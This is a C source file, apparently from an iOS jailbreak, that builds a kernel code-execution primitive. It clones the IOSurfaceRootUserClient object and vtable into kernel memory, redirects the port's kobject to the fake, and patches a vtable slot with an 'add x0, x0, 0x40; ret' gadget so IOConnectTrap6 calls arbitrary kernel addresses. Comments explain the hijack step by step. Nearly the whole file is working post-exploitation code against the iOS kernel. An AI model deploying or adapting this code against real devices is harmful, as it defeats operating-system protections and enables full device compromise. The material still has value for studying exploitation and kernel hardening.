#include "KernelUtils.h"
#include "KernelRwWrapper.h"
#include "ImportantHolders.h"
#include "find_port.h"
#include "kernel_call.h"
#include "common.h"
#include "iokit.h"
#include <pthread.h>
#import "patchfinder64.h"
#include "parameters.h"
#include "kc_parameters.h"
#include "kernel_memory.h"
#include "PFOffs.h"
#include "remap_tfp_set_hsp.h"
#include "OffsetHolder.h"
#include "IOKitLibTW.h"
//#include "IOKitLib.h"

#if !__arm64e__
static mach_port_t prepare_user_client(void)
{
    kern_return_t err;
    mach_port_t user_client;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULLK) {
        LOG("unable to find service");
        exit(EXIT_FAILURE);
    }
    
    err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS) {
        LOG("unable to get user client connection");
        exit(EXIT_FAILURE);
    }
    util_info("got user client: 0x%x", user_client);
    return user_client;
}

static mach_port_t user_client;
static uint64_t IOSurfaceRootUserClient_port;
static uint64_t IOSurfaceRootUserClient_addr;
static uint64_t fake_vtable;
static uint64_t fake_client;
static const int fake_kalloc_size = 0x1000;
#endif
static pthread_mutex_t kexecute_lock;

bool init_kexecute(void)
{
#if __arm64e__
    if (!parameters_init()) return false;
    kernel_task_port = tfp0;
    if (!MACH_PORT_VALID(kernel_task_port)) return false;
    current_task = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (!ISADDR(current_task)) return false;
    kernel_task = ReadKernel64(GETOFFSET(kernel_task));
    if (!ISADDR(kernel_task)) return false;
    if (!kernel_call_init()) return false;
#else
    user_client = prepare_user_client();
    if (!MACH_PORT_VALID(user_client)) {
        printf("boo hoo failed fks\n");
        return false;
    }
    
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_port = get_address_of_port(getpid(), user_client); // UserClients are just mach_ports, so we find its address
    if (!ISADDR(IOSurfaceRootUserClient_port)) return false;
    util_info("IOSurfaceRootUserClient_addr");
    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0
        IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        if (!ISADDR(IOSurfaceRootUserClient_addr)) return false;
        uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
        if (!ISADDR(IOSurfaceRootUserClient_vtab)) return false;
        util_info("IOSurfaceRootUserClient_vtab");
        fake_vtable = kmem_alloc(fake_kalloc_size);
        if (!ISADDR(fake_vtable)) return false;
        for (int i = 0; i < 0x200; i++) {
            wk64(fake_vtable + i * 8, rk64(IOSurfaceRootUserClient_vtab + i * 8)); }
        fake_client = kmem_alloc(fake_kalloc_size);
        if (!ISADDR(fake_client)) return false;
        for (int i = 0; i < 0x200; i++) {
            wk64(fake_client + i * 8, rk64(IOSurfaceRootUserClient_addr + i * 8)); }
        wk64(fake_client, fake_vtable);
        wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
        wk64(fake_vtable + 8 * 0xB7, GETOFFSET(add_x0_x0_0x40_ret));
    } else {
        IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        if (!ISADDR(IOSurfaceRootUserClient_addr)) return false;
        uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr);
        if (!ISADDR(IOSurfaceRootUserClient_vtab)) return false;
        util_info("IOSurfaceRootUserClient_vtab");
        fake_vtable = kmem_alloc(fake_kalloc_size);
        if (!ISADDR(fake_vtable)) return false;
        for (int i = 0; i < 0x200; i++) {
            WriteKernel64(fake_vtable + i * 8, ReadKernel64(IOSurfaceRootUserClient_vtab + i * 8)); }
        fake_client = kmem_alloc(fake_kalloc_size);
        if (!ISADDR(fake_client)) return false;
        for (int i = 0; i < 0x200; i++) {
            WriteKernel64(fake_client + i * 8, ReadKernel64(IOSurfaceRootUserClient_addr + i * 8)); }
        WriteKernel64(fake_client, fake_vtable);
        WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
        WriteKernel64(fake_vtable + 8 * 0xB7, GETOFFSET(add_x0_x0_0x40_ret));
    }
    util_info("WriteKernel64 fake_vtable");
#endif
    pthread_mutex_init(&kexecute_lock, NULL);
    return true;
}

void term_kexecute(void)
{
#if __arm64e__
    kernel_call_deinit();
#else
    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0
        wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
        kmem_free(fake_vtable, fake_kalloc_size);
        kmem_free(fake_client, fake_kalloc_size); }
    else {
        WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
        kmem_free(fake_vtable, fake_kalloc_size);
        kmem_free(fake_client, fake_kalloc_size);

    }
    IOServiceClose(user_client);
#endif
    pthread_mutex_destroy(&kexecute_lock);
}

uint64_t kexecute2(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6)
{
    uint64_t returnval = 0;
    pthread_mutex_lock(&kexecute_lock);
#if __arm64e__
    returnval = kernel_call_7(addr, 7, x0, x1, x2, x3, x4, x5, x6);
#else
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0

        uint64_t offx20 = rk64(fake_client + 0x40);
        uint64_t offx28 = rk64(fake_client + 0x48);
        wk64(fake_client + 0x40, x0);
        wk64(fake_client + 0x48, addr);
        returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
        wk64(fake_client + 0x40, offx20);
        wk64(fake_client + 0x48, offx28); }
    else {
        uint64_t offx20 = ReadKernel64(fake_client + 0x40);
        uint64_t offx28 = ReadKernel64(fake_client + 0x48);
        WriteKernel64(fake_client + 0x40, x0);
        WriteKernel64(fake_client + 0x48, addr);
        returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
        WriteKernel64(fake_client + 0x40, offx20);
        WriteKernel64(fake_client + 0x48, offx28);
    }
#endif
    pthread_mutex_unlock(&kexecute_lock);
    LOG(""ADDR"("ADDR", "ADDR", "ADDR", "ADDR", "ADDR", "ADDR", "ADDR"): "ADDR"", addr, x0, x1, x2, x3, x4, x5, x6, returnval);
    return returnval;
}
